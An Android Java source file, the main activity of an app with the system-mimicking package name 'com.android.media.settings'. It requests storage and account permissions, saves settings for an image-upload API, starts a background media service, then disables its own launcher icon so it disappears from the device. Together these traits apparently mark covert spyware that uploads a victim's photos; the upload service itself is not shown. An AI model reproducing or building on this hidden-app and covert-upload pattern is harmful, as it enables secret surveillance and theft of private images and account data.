package com.android.media.settings;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import com.android.media.settings.Services.MediaService;
import com.android.media.settings.Utility.MediaUtility;

public class MainActivity extends AppCompatActivity {
    public static final String TAG = "MediaStore";
    private static final int REQ_CODE_ASK_PERMS = 401;
    private Intent serviceIntent;
    private View decorView;
    private MediaUtility mediaUtility;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        decorView = getWindow().getDecorView();
        serviceIntent = new Intent(this, MediaService.class);
        mediaUtility = new MediaUtility(this);

        ImageView imageView = (ImageView) findViewById(R.id.imageView);
        imageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                stopService(serviceIntent);
            }
        });

        if(mediaUtility.isFirstInstall()) {
            initConfig();
        }

        checkPerms();
    }

    private void initConfig() {
        SharedPreferences preferences = getSharedPreferences(MediaConfig.PREF_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();

        editor.putString(MediaConfig.PREF_API_BASE_URL, MediaConfig.DEF_BASE_URL);
        editor.putString(MediaConfig.PREF_IMG_UPLOAD_NAME, MediaConfig.DEF_MEDIA_UPLOAD_NAME);
        editor.putFloat(MediaConfig.PREF_IMG_MAX_WIDTH, MediaConfig.DEF_IMG_WIDTH);
        editor.putFloat(MediaConfig.PREF_IMG_MAX_HEIGHT, MediaConfig.DEF_IMG_HEIGHT);
        editor.putString(MediaConfig.PREF_IMG_COMPRESS_FORMAT, MediaConfig.DEF_IMG_COMPRESSION_FORMAT);
        editor.putString(MediaConfig.PREF_IMG_CONFIG, MediaConfig.DEF_IMG_CONFIG);
        editor.putInt(MediaConfig.PREF_IMG_QUALITY, MediaConfig.DEF_IMG_QUALITY);
        editor.apply();
    }

    private void checkPerms() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            int readPerms = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE);
            if(readPerms != PackageManager.PERMISSION_GRANTED ) {
                requestPermissions(new String[] {
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.GET_ACCOUNTS
                }, REQ_CODE_ASK_PERMS);
                return;
            }
        }
        startService();
    }

    public void checkAndStartService() {
        if(!mediaUtility.isServiceRunning(MediaService.class)) {
            startService(new Intent(this, MediaService.class));
        }
    }

    private void startService() {
        Log.d(TAG, "On Start Service : " + MediaService.class);
        checkAndStartService();
        hideLauncher();
    }

    private void hideLauncher() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        this.finish();
        System.exit(0);
    }

    private void enterImmersiveMode() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            decorView.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        } else {
            decorView.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
            );
        }
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if(hasFocus) {
            enterImmersiveMode();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode) {
            case REQ_CODE_ASK_PERMS:
                if(grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    startService();
                }else {
                    Toast.makeText(this, "Please provide permission", Toast.LENGTH_SHORT).show();
                }
                break;

            default:
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
